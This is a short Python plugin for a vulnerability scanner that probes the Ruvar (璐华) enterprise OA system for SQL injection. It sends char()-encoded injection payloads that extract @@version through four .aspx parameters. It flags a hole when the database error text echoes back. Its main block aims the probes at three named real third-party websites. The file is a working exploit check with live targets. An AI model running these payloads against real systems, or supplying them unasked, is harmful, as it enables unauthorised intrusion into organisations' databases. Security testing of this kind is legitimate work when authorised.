#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:璐华通用企业版OA系统SQL注入4处（完美绕过感谢林）4
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0104430

def assign(service,arg):
    if service=="ruvar_oa":
        return True,arg 
    


def  audit(arg):
    ps=[
        "OnlineChat/chat_show.aspx?id=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version",
        "WorkFlow/wf_work_print.aspx?idlist=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version",
        "OnlineChat/chatroom_show.aspx?id=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version",
        "OnlineReport/get_condiction.aspx?t_id=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version",
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        if code==500 and "GAO JI@Microsoft" in res:
            security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    
    audit(assign('ruvar_oa','http://oa.gdjierong.com:8090/')[1])
    audit(assign('ruvar_oa','http://oa.mingshiedu.com:801/')[1])
    audit(assign('ruvar_oa','http://oa.pku-ioe.cn/')[1])